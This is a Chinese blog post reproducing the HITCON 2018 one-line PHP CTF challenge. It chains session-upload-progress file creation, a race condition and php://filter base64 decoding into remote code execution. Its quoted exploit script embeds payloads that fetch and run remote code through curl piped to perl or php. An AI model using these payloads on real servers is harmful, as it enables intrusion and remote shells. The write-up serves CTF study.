<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>one-line-php-challenge 复现 | 闲言语</title><meta name=keywords content><meta name=description content="源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。
解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123&amp;foo=bar ，则 $_GET 为 array ('orange' => '123','foo' => 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ?"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/181123-one-line-php-challenge/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="one-line-php-challenge 复现"><meta property="og:description" content="源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。
解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123&amp;foo=bar ，则 $_GET 为 array ('orange' => '123','foo' => 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ?"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/181123-one-line-php-challenge/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-11-23T08:31:07+08:00"><meta property="article:modified_time" content="2018-11-23T08:31:07+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="one-line-php-challenge 复现"><meta name=twitter:description content="源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。
解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123&amp;foo=bar ，则 $_GET 为 array ('orange' => '123','foo' => 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ?"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"one-line-php-challenge 复现","item":"https://ret2neo.cn/post/181123-one-line-php-challenge/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"one-line-php-challenge 复现","name":"one-line-php-challenge 复现","description":"源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。\n解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123\u0026amp;foo=bar ，则 $_GET 为 array ('orange' =\u0026gt; '123','foo' =\u0026gt; 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为\u0026lt;?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ?","keywords":[],"articleBody":"源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。\n解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123\u0026foo=bar ，则 $_GET 为 array ('orange' =\u003e '123','foo' =\u003e 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为\u003c?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ? (expr2) : (expr3) 是一个条件运算符，和C语言类似。 使用orange参数从URL传入一个文件名，如果该文件第一行的前六个字符是@\u003c?php ，就将它包含并运行。 相关文档： Assignment Operators , $_GET , Error Control Operators , 三元运算符 关键点 创建文件 allow_url_include 默认值是off ，因此无法包含远程文件。那么如果要包含本地文件，就需要已知的文件名和可控的文件内容。\n最主要的利用点在于：如果在上传文件的同时POST PHP_SESSION_UPLOAD_PROGRESS 参数，PHP就会为我们创建session，并且session文件名可以通过cookie中的PHPSESSID控制。\n做个实验。\n我的环境：PHP7.2 + Apache on Kali 4.18\n会发现确实如此。而且不仅如此。\n1 2 3 4 curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=iamnotorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1\u003e/dev/null curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=iamnotorange2' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2' -F 'foobar=anystring' 1\u003e/dev/null curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=iamnotorange3' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3' 1\u003e/dev/null curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=iamnotorange4' -d 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4' 1\u003e/dev/null 我执行了四次请求。第一次是使用multipart传一个文件和一个字符串，可以同时生成session文件并且控制文件名，第二次传两个字符串，只能生成文件，文件名是随机的，第三次只有一个字符串，效果同第二次，第四个直接post一个字符串，无法生成session文件。四次请求的报文形式如下。\n但是我们还会发现，无论怎样请求，文件内容总是为空，这是因为 session.upload_progress.cleanup=on ，导致文件一上传完马上被清空。这是我们可以用条件竞争或者传超大文件来保留文件内容。\n条件竞争 1 2 3 4 5 6 7 8 9 10 11 #loop.py import os from multiprocessing.dummy import Pool as threadpool sessname=\"iamnotorange\" def runner(i): cmd=\"curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=%s' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1\u003e/dev/null\"%sessname os.system(cmd) os.system(\"xxd /var/lib/php/sessions/sess_%s \"%sessname) pool=threadpool(30) result=pool.map_async(runner,range(30)).get(0xffff) 可以观察到，文件内容的前一部分是可控的。\n超大文件 变换文件内容 到此为止，我们实现了控制文件名和文件内容，但是文件内容的形式是固定的，即以upload_progress_ 开头，而我们期望他是以 @\u003c?php 开头。于是需要变换文件内容，可以利用 php://filter ，比如将文件内容多次base64解码得到我们想要的字符串。\nbase64解码的特点在于：\n可以将字符串每四个字符分一组，每组解码后变成三个字符，组与组之间互不影响。 base64编码后的字符串只会包含 [0-9a-z-A-Z+\\=] ，如果解码时遇到这些字符之外的就会被忽略，或者说，解码前会先将非法字符删除。 所以实际上\n1 python -c \"import base64;print base64.b64decode('\\x11\\x22\\x23\\x24'*24+base64.b64encode('test'))\" 的执行结果还是test。\n我们只要想办法让upload_progress_ 解码后成为不合法字符从而被忽略就可以了，所以需要加一些垃圾数据。因为 upload_progress_ 有16个字符\n结合利用 将诸如\n1 @\u003c?php `curl remote.ip | php - ;?\u003e` 的payload三次编码再加上填充数据后作为 PHP_SESSION_UPLOAD_PROGRESS 的值上传，然后利用\nphp://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever 包含进来即可执行命令。可采用多线程竞争或者大文件上传保留session文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 #https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py import sys import string import requests from base64 import b64encode from random import sample, randint from multiprocessing.dummy import Pool as ThreadPool HOST = 'http://54.250.246.238/' sess_name = 'iamorange' headers = { 'Connection': 'close', 'Cookie': 'PHPSESSID=' + sess_name } payload = '@\u003c?php `curl orange.tw/w/bc.pl|perl -`;?\u003e' while 1: junk = ''.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if '=' not in x and '=' not in xx and '=' not in xxx: payload = xxx print payload break def runner1(i): data = { 'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z' } while 1: fp = open('/etc/passwd', 'rb') r = requests.post(HOST, files={'f': fp}, data=data, headers=headers) fp.close() def runner2(i): filename = '/var/lib/php/sessions/sess_' + sess_name filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename # print filename while 1: url = '%s?orange=%s' % (HOST, filename) r = requests.get(url, headers=headers) c = r.content if c and 'orange' not in c: print [c] if sys.argv[1] == '1': runner = runner1 else: runner = runner2 pool = ThreadPool(32) result = pool.map_async( runner, range(32) ).get(0xffff) 相关链接 http://www.wupco.cn/?p=4460 https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge https://bugs.php.net/bug.php?id=72681 ","wordCount":"491","inLanguage":"en","datePublished":"2018-11-23T08:31:07+08:00","dateModified":"2018-11-23T08:31:07+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/181123-one-line-php-challenge/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>one-line-php-challenge 复现</h1><div class=post-meta><span title='2018-11-23 08:31:07 +0800 CST'>November 23, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/181123-one-line-php-challenge.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e6%ba%90%e7%a0%81 aria-label=源码>源码</a></li><li><a href=#%e8%a7%a3%e8%af%bb aria-label=解读>解读</a></li><li><a href=#%e5%85%b3%e9%94%ae%e7%82%b9 aria-label=关键点>关键点</a><ul><li><a href=#%e5%88%9b%e5%bb%ba%e6%96%87%e4%bb%b6 aria-label=创建文件>创建文件</a><ul><li><a href=#%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89 aria-label=条件竞争>条件竞争</a></li><li><a href=#%e8%b6%85%e5%a4%a7%e6%96%87%e4%bb%b6 aria-label=超大文件>超大文件</a></li></ul></li><li><a href=#%e5%8f%98%e6%8d%a2%e6%96%87%e4%bb%b6%e5%86%85%e5%ae%b9 aria-label=变换文件内容>变换文件内容</a></li></ul></li><li><a href=#%e7%bb%93%e5%90%88%e5%88%a9%e7%94%a8 aria-label=结合利用>结合利用</a></li><li><a href=#%e7%9b%b8%e5%85%b3%e9%93%be%e6%8e%a5 aria-label=相关链接>相关链接</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=源码>源码<a hidden class=anchor aria-hidden=true href=#源码>#</a></h1><p>环境：<code>This is a default installation PHP7.2 + Apache on Ubuntu 18.04</code> 。</p><p><img loading=lazy src=2018-10-23_200848.png alt=alt></p><h1 id=解读>解读<a hidden class=anchor aria-hidden=true href=#解读>#</a></h1><ul><li><code>$_GET</code> 是一个数组，包含通过URL参数传给当前脚本的变量。如访问<code>localhost?orange=123&amp;foo=bar</code> ，则 <code>$_GET</code> 为 <code>array ('orange' => '123','foo' => 'bar',)</code> ，<code>$_GET['orange']</code> 为<code>'123'</code> 。另外，<code>$_GET</code> 是超全局变量，即在全部作用域中始终可用的内置变量。</li><li><code>@</code>被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<code>&lt;?php $_=$_GET['orange'];</code> 的PHP文件，直接访问其会报错 <code>Notice : Undefined index: orange in...</code> ，加上 <code>@</code> 后就不会显示错误信息。</li><li>赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。<code>The value of an assignment expression is the value assigned</code> 。</li><li><code>$_</code> 。一个普通的变量名。</li><li><code>file()</code> 。把整个文件读入数组中。<ul><li><code>array file ( string $filename [, int $flags = 0 [, resource $context ]] )</code></li><li><img loading=lazy src=943e00113e56247d2.png alt></li><li><img loading=lazy src=cdfbaa9f2aeeedfa9.png alt></li></ul></li><li><code>string substr ( string $string , int $start [, int $length ] )</code> 。</li><li>include 语句包含并运行指定文件。</li><li><code>(expr1) ? (expr2) : (expr3)</code> 是一个条件运算符，和C语言类似。</li><li>使用orange参数从URL传入一个文件名，如果该文件第一行的前六个字符是<code>@&lt;?php</code> ，就将它包含并运行。</li><li>相关文档： <a href=http://php.net/manual/en/language.operators.assignment.php>Assignment Operators</a> , <a href=http://php.net/manual/en/reserved.variables.get.php>$_GET</a> , <a href=http://php.net/manual/en/language.operators.errorcontrol.php>Error Control Operators</a> , <a href=http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary>三元运算符</a></li></ul><h1 id=关键点>关键点<a hidden class=anchor aria-hidden=true href=#关键点>#</a></h1><h2 id=创建文件>创建文件<a hidden class=anchor aria-hidden=true href=#创建文件>#</a></h2><p><code>allow_url_include</code> 默认值是<code>off</code> ，因此无法包含远程文件。那么如果要包含本地文件，就需要已知的文件名和可控的文件内容。</p><p>最主要的利用点在于：如果在上传文件的同时POST <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，PHP就会为我们创建session，并且session文件名可以通过cookie中的PHPSESSID控制。</p><p>做个实验。</p><p>我的环境：<code>PHP7.2 + Apache on Kali 4.18</code></p><p><img loading=lazy src=17bec586f38216582.png alt></p><p>会发现确实如此。而且不仅如此。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s 127.0.0.1/oneline.php -H <span style=color:#e6db74>&#39;Cookie: PHPSESSID=iamnotorange&#39;</span> -F <span style=color:#e6db74>&#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking&#39;</span> -F <span style=color:#e6db74>&#39;file=@/etc/passwd&#39;</span> 1&gt;/dev/null
</span></span><span style=display:flex><span>curl -s 127.0.0.1/oneline.php -H <span style=color:#e6db74>&#39;Cookie: PHPSESSID=iamnotorange2&#39;</span> -F <span style=color:#e6db74>&#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2&#39;</span> -F <span style=color:#e6db74>&#39;foobar=anystring&#39;</span> 1&gt;/dev/null
</span></span><span style=display:flex><span>curl -s 127.0.0.1/oneline.php -H <span style=color:#e6db74>&#39;Cookie: PHPSESSID=iamnotorange3&#39;</span> -F <span style=color:#e6db74>&#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3&#39;</span>  1&gt;/dev/null
</span></span><span style=display:flex><span>curl -s 127.0.0.1/oneline.php -H <span style=color:#e6db74>&#39;Cookie: PHPSESSID=iamnotorange4&#39;</span> -d <span style=color:#e6db74>&#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4&#39;</span>  1&gt;/dev/null
</span></span></code></pre></td></tr></table></div></div><p>我执行了四次请求。第一次是使用multipart传一个文件和一个字符串，可以同时生成session文件并且控制文件名，第二次传两个字符串，只能生成文件，文件名是随机的，第三次只有一个字符串，效果同第二次，第四个直接post一个字符串，无法生成session文件。四次请求的报文形式如下。</p><p><img loading=lazy src=7dcc4ac9d519d0060.png alt></p><p><img loading=lazy src=6afff7e24fd222842.png alt></p><p><img loading=lazy src=ff4e1578e097ad94b.png alt></p><p><img loading=lazy src=8cb93ba20fd1de871.png alt></p><p>但是我们还会发现，无论怎样请求，文件内容总是为空，这是因为 <code>session.upload_progress.cleanup=on</code> ，导致文件一上传完马上被清空。这是我们可以用条件竞争或者传超大文件来保留文件内容。</p><h3 id=条件竞争>条件竞争<a hidden class=anchor aria-hidden=true href=#条件竞争>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#loop.py</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> multiprocessing.dummy <span style=color:#f92672>import</span> Pool <span style=color:#66d9ef>as</span> threadpool
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sessname<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iamnotorange&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>runner</span>(i):
</span></span><span style=display:flex><span>	cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;curl -s 127.0.0.1/oneline.php -H &#39;Cookie: PHPSESSID=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; -F &#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking&#39; -F &#39;file=@/etc/passwd&#39; 1&gt;/dev/null&#34;</span><span style=color:#f92672>%</span>sessname
</span></span><span style=display:flex><span>	os<span style=color:#f92672>.</span>system(cmd)
</span></span><span style=display:flex><span>	os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;xxd /var/lib/php/sessions/sess_</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> &#34;</span><span style=color:#f92672>%</span>sessname)
</span></span><span style=display:flex><span>pool<span style=color:#f92672>=</span>threadpool(<span style=color:#ae81ff>30</span>)
</span></span><span style=display:flex><span>result<span style=color:#f92672>=</span>pool<span style=color:#f92672>.</span>map_async(runner,range(<span style=color:#ae81ff>30</span>))<span style=color:#f92672>.</span>get(<span style=color:#ae81ff>0xffff</span>)
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=86e2d0b9338f09673.png alt></p><p>可以观察到，文件内容的前一部分是可控的。</p><h3 id=超大文件>超大文件<a hidden class=anchor aria-hidden=true href=#超大文件>#</a></h3><h2 id=变换文件内容>变换文件内容<a hidden class=anchor aria-hidden=true href=#变换文件内容>#</a></h2><p>到此为止，我们实现了控制文件名和文件内容，但是文件内容的形式是固定的，即以<code>upload_progress_</code> 开头，而我们期望他是以 <code>@&lt;?php</code> 开头。于是需要变换文件内容，可以利用 <code>php://filter</code> ，比如将文件内容多次base64解码得到我们想要的字符串。</p><p>base64解码的特点在于：</p><ul><li>可以将字符串每四个字符分一组，每组解码后变成三个字符，组与组之间互不影响。</li><li>base64编码后的字符串只会包含 <code>[0-9a-z-A-Z+\=]</code> ，如果解码时遇到这些字符之外的就会被忽略，或者说，解码前会先将非法字符删除。</li></ul><p>所以实际上</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span 